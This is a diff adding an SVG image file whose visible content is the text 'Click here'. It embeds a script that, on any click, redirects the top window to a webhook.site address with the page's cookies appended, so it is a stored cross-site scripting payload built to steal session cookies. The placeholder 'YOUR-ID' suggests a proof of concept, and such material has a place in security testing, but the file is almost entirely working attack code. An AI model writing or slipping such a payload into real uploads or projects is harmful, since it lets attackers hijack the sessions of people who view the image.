@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    document.onclick = () => {
+      window.top.location = "https://webhook.site/YOUR-ID?cookie=" + document.cookie;
+    }
+  </script>
+  <text x="20" y="40" font-size="20">Click here</text>
+</svg>
